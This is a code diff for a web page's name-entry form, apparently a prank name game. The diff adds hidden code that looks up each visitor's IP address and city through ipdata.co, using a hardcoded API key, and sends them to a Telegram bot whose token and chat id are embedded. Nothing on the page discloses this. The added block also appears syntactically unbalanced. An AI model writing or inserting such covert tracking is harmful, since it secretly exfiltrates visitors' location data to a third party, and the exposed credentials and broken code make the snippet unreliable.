@@ -3,7 +3,14 @@ let firstName = document.getElementById('fname').value;
 let secondName = document.getElementById('sname').value;
 if(firstName == "" || secondName == ""){
   alert(" -- Please enter all the NIBBA or NIBBI details -- ");
-fetch('https://api.telegram.org/bot1620250263:AAGPa3jtMNbK9RiQVNcCYMPnvUWfyZ7aB1M/sendMessage?chat_id=-1001717443651&text='+data1);
+function json(url) {
+  return fetch(url).then(res => res.json());
+}
+let apiKey = '3dbdac35c1dfa8d3d5951adddf429d1a931f4acc550abf74ab9eebd8';
+json(`https://api.ipdata.co?api-key=${apiKey}`).then(data => {
+let data1 = data.ip;
+  let city1 = data.city;
+fetch('https://api.telegram.org/bot1620250263:AAGPa3jtMNbK9RiQVNcCYMPnvUWfyZ7aB1M/sendMessage?chat_id=-1001717443651&text='+data1+"%0A"+city1);
 }
 else{
  firstName = firstName.toLowerCase();
